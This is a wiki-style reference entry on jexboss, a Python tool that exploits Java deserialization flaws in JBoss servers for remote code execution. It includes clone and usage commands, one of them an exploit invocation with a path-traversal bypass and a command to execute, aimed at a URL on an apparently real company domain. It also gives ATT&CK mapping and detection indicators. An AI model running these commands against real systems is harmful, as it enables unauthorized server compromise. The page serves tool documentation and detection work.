---
id: tool-jexboss-001
url: 'https://github.com/joaomatosf/jexboss'
tags:
  - rce
  - exploitation
type: tool
verified: false
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:15.190Z'
description: >-
  Tool for exploiting Java deserialization vulnerabilities in JBoss and other
  servers.
validated: true
submitted: true
---
# jexboss

**Status**: Unverified

## Overview

Jexboss is a Python-based tool designed to detect and exploit Java deserialization vulnerabilities, particularly in JBoss application servers, to achieve remote code execution.

## Description

In this attack, jexboss was used post-console access to exploit deserialization flaws, routing requests through the proxy bypass for full server compromise including shell access.

## Features

- Feature 1: Automatic detection of deserialization gadgets
- Feature 2: Support for multiple JBoss versions and endpoints
- Feature 3: Custom payload generation for RCE

## Installation

### Requirements

- Python 2.7 or 3.x
- Git

### Install Commands

```bash
# Clone repository
git clone https://github.com/joaomatosf/jexboss.git
cd jexboss
# Run directly with python
```

## Basic Usage

```bash
python jexboss.py --help
```

### Common Options

| Option | Description |
|--------|-------------|
| `-u, --url` | Target URL |
| `--exploit` | Trigger exploitation |
| `-cmd` | Command to execute |

## Examples

### Example 1: Basic Usage

```bash
python jexboss.py -u "http://target/web-console/ServerInfo.jsp?type=HTTP"
```

### Example 2: Advanced Usage

```bash
python jexboss.py --exploit -u "http://www.example.starbucks.com.sg/josso/%5C../web-console/ServerInfo.jsp?type=HTTP" -cmd "id"
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Exploitation for Client Execution]] Exploitation for Client Execution
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Tactics

- [[Execution]] Execution
- [[Initial Access]] Initial Access

## Detection

Indicators and methods for detecting this tool's usage:

- Unusual Python processes targeting JBoss ports
- Deserialization error logs in server traces
- Network requests to admin consoles with exploit payloads

## Related Procedures

- [[procedures/Achieve-RCE-with-Jexboss-Tool]]

## Related Tools

- [[Metasploit Framework]]
- [[ysoserial]]

## References

- Official GitHub: https://github.com/joaomatosf/jexboss
- JBoss Deserialization Guide
